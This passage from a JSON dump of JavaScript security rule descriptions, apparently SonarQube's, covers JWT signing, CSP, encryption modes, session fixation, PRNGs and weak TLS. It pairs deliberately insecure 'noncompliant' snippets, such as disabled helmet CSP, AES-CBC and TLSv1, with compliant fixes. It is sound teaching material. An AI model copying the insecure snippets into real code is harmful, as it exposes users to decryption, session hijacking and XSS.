callbackcheck);\n</pre>\n<h3>How does this work?</h3>\n<h4>Always sign your tokens</h4>\n<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can\ntamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a\nsigning function, and using it is usually as simple as providing a secret key when the token is created.</p>\n<h4>Choose a strong cipher algorithm</h4>\n<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are\nconsidered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),\nwhich uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be\nable to forge tokens.</p>\n<h4>Verify the signature of your tokens</h4>\n<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:\nvalidating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating\nsignatures, they are not serving their purpose.</p>\n<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding\nprocess that the signature of the JWT should also be checked.</p>\n<p>To resolve the issue, follow these instructions:</p>\n<ol>\n  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not\n  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>\n  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating\n  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for\n  further investigation. </li>\n  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature\n  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>\n</ol>\n<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on\ntampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>\n<h3>Going the extra mile</h3>\n<h4>Securely store your secret keys</h4>\n<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control\nsystem. Instead, consider using environment variables, secure key management systems, or vault services.</p>\n<h4>Rotate your secret keys</h4>\n<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to\nperiodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be\nsure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5728": {
        "name": "Disabling content security policy fetch directives is security-sensitive",
        "htmlDesc": "<p>Content security policy (CSP) (fetch directives) is a <a href=\"https://www.w3.org/TR/CSP3/\">W3C standard </a> which is used by a server to specify,\nvia a http header, the origins from where the browser is allowed to load resources. It can help to mitigate the risk of cross site scripting (XSS)\nattacks and reduce privileges used by an application. If the website doesn’t define CSP header the browser will apply <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">same-origin policy</a> by default.</p>\n<pre>\nContent-Security-Policy: default-src 'self'; script-src ‘self ‘ http://www.example.com\n</pre>\n<p>In the above example, all resources are allowed from the website where this header is set and script resources fetched from example.com are also\nauthorized:</p>\n<pre>\n&lt;img src=\"selfhostedimage.png&gt;&lt;/script&gt; &lt;!-- will be loaded because default-src 'self'; directive is applied  --&gt;\n&lt;img src=\"http://www.example.com/image.png&gt;&lt;/script&gt;  &lt;!-- will NOT be loaded because default-src 'self'; directive is applied  --&gt;\n&lt;script src=\"http://www.example.com/library.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;\n&lt;script src=\"selfhostedscript.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.com directive is applied  --&gt;\n&lt;script src=\"http://www.otherexample.com/library.js&gt;&lt;/script&gt; &lt;!-- will NOT be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The resources of the application are fetched from various untrusted locations. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement content security policy fetch directives, in particular <em>default-src</em> directive and continue to properly sanitize and validate all\ninputs of the application, indeed CSP fetch directives is only a tool to reduce the impact of cross site scripting attacks.</p>\n<h2>Sensitive Code Example</h2>\n<p>In a Express.js application, the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet\">helmet</a> contentSecurityPolicy\nmiddleware is disabled:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\napp.use(\n    helmet({\n      contentSecurityPolicy: false, // sensitive\n    })\n);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Express.js application, a standard way to implement CSP is the <a href=\"https://www.npmjs.com/package/helmet\">helmet contentSecurityPolicy\nmiddleware</a>:</p>\n<pre>\nconst express = require('express');\nconst helmet = require('helmet');\n\nlet app = express();\napp.use(helmet.contentSecurityPolicy()); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://www.w3.org/TR/CSP3/\">w3.org</a> - Content Security Policy Level 3 </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">developer.mozilla.org</a> - Content Security Policy (CSP) </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S4787": {
        "name": "Encrypting data is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS4426'>S4426</a>, <a href='/coding_rules#rule_key=javascript%3AS5542'>S5542</a>, <a href='/coding_rules#rule_key=javascript%3AS5547'>S5547</a> instead.</p>\n<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902\">CVE-2017-7902</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378\">CVE-2006-1378</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376\">CVE-2003-1376</a> </li>\n</ul>\n<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed\nregularly. However these are not the only means to defeat or weaken an encryption.</p>\n<p>This rule flags function calls that initiate encryption/decryption.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>\n  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>\n  <li> the key exchange is made without properly authenticating the receiver. </li>\n  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time\n  passes. </li>\n  <li> the chosen encryption library is deemed unsafe. </li>\n  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>\n  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.\n  </li>\n  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random\n  algorithm, or it is reused. </li>\n  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.\n  </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Generate encryption keys using secure random algorithms. </li>\n  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force\n  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.\n  </li>\n  <li> Regenerate the keys regularly. </li>\n  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>\n  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>\n  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are\n  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most\n  probably have flaws. </li>\n  <li> When a nonce is used, generate it randomly every time. </li>\n  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>\n  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks\n  like \"Chosen-Plaintext Attacks\". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption\n  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>\n  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be\n  preferred to the following combinations which are not secured:\n    <ul>\n      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it\n      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in\n      cryptographic protocols at all. </li>\n      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === Client side ===\ncrypto.subtle.encrypt(algo, key, plainData); // Sensitive\ncrypto.subtle.decrypt(algo, key, encData); // Sensitive\n</pre>\n<pre>\n// === Server side ===\nconst crypto = require(\"crypto\");\nconst cipher = crypto.createCipher(algo, key); // Sensitive\nconst cipheriv = crypto.createCipheriv(algo, key, iv); // Sensitive\nconst decipher = crypto.createDecipher(algo, key); // Sensitive\nconst decipheriv = crypto.createDecipheriv(algo, key, iv); // Sensitive\nconst pubEnc = crypto.publicEncrypt(key, buf); // Sensitive\nconst privDec = crypto.privateDecrypt({ key: key, passphrase: secret }, pubEnc); // Sensitive\nconst privEnc = crypto.privateEncrypt({ key: key, passphrase: secret }, buf); // Sensitive\nconst pubDec = crypto.publicDecrypt(key, privEnc); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/321\">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/322\">CWE-322 - Key Exchange without Entity Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/323\">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/324\">CWE-324 - Use of a Key Past its Expiration Date</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/325\">CWE-325 - Missing Required Cryptographic Step</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst crypto = require('crypto');\n\ncrypto.createCipheriv(\"AES-128-CBC\", key, iv); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\ncrypto.createCipheriv(\"AES-256-GCM\", key, iv);\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5876": {
        "name": "A new session should be created during user authentication",
        "htmlDesc": "<p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and\nimpersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>\n<h2>Why is this an issue?</h2>\n<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically\nworks:</p>\n<ul>\n  <li> When a user visits a website or logs in, a session is created for them. </li>\n  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,\n  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>\n  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the\n  attacker. </li>\n  <li> At this point, the attacker can hijack and impersonate the victim’s session. </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain\nunauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>\n<h4>Impersonation</h4>\n<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid\ncredentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing\nmalicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as\nrevealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>\n<h4>Data Breach</h4>\n<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include\npersonal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can\nbe used for identity theft, financial fraud, or other malicious purposes.</p>\n<h4>Privilege Escalation</h4>\n<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher\nprivileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized\nmodifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>\n<h2>How to fix it in Passport</h2>\n<h3>Code examples</h3>\n<p>Upon user authentication, it is crucial to regenerate the session identifier to prevent fixation attacks. Passport provides a mechanism to achieve\nthis by using the <code>req.session.regenerate()</code> method. By calling this method after successful authentication, you can ensure that each user\nis assigned a new and unique session ID.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\napp.post('/login',\n  passport.authenticate('local', { failureRedirect: '/login' }),\n  function(req, res) {\n    // Noncompliant - no session.regenerate after login\n    res.redirect('/');\n  });\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\napp.post('/login',\n  passport.authenticate('local', { failureRedirect: '/login' }),\n  function(req, res) {\n    let prevSession = req.session;\n    req.session.regenerate((err) =&gt; {\n      Object.assign(req.session, prevSession);\n      res.redirect('/');\n    });\n  });\n</pre>\n<h3>How does this work?</h3>\n<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated\nduring the authentication process.</p>\n<p>Here’s how session fixation protection typically works:</p>\n<ol>\n  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored\n  in a cookie or passed through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows\n  the attacker to potentially gain unauthorized access to the user’s session. </li>\n  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a\n  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li>\n  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.\n  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>\n  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier\n  is typically stored in a new session cookie or passed through URL parameters. </li>\n</ol>\n<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,\nsecure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s\nsession and helps maintain the integrity and security of the application’s session management process.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Express.js Documentation - <a href=\"http://expressjs.com/en/resources/middleware/session.html\">express-session</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://medium.com/passportjs/fixing-session-fixation-b2b68619c51d\">Fixing Session Fixation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Session_fixation\">OWASP Sesssion Fixation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the <code>Math.random()</code> function relies on a weak pseudorandom number generator, this function should not be used for security-critical\napplications or for protecting sensitive data. In such context, a cryptographically strong pseudorandom number generator (CSPRNG) should be used\ninstead.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a cryptographically strong pseudorandom number generator (CSPRNG) like <code>crypto.getRandomValues()</code>. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst val = Math.random(); // Sensitive\n// Check if val is used in a security context.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// === Client side ===\nconst crypto = window.crypto || window.msCrypto;\nvar array = new Uint32Array(1);\ncrypto.getRandomValues(array); // Compliant for security-sensitive use cases\n\n// === Server side ===\nconst crypto = require('crypto');\nconst buf = crypto.randomBytes(1); // Compliant for security-sensitive use cases\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>NodeJs offers multiple ways to set weak TLS protocols. For https and tls, <a\nhref=\"https://nodejs.org/api/tls.html#tlscreatesecurecontextoptions\">these options</a> are used and are used in other third-party libraries as\nwell.</p>\n<p>The first is <code>secureProtocol</code>:</p>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n secureProtocol: 'TLSv1_method' // Noncompliant\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<p>The second is the combination of <code>minVersion</code> and <code>maxVerison</code>. Note that they cannot be specified along with the\n<code>secureProtocol</code> option:</p>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\nconst https = require('node:https');\nconst tls   = require('node:tls');\n\nlet options = {\n  minVersion: 'TLSv1.1',  // Noncompliant\n  maxVersion: 'TLSv1.2'\n};\n\nlet req    = https.request(options, (res) =&gt; { });\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; { });\n</pre>\n<p>And 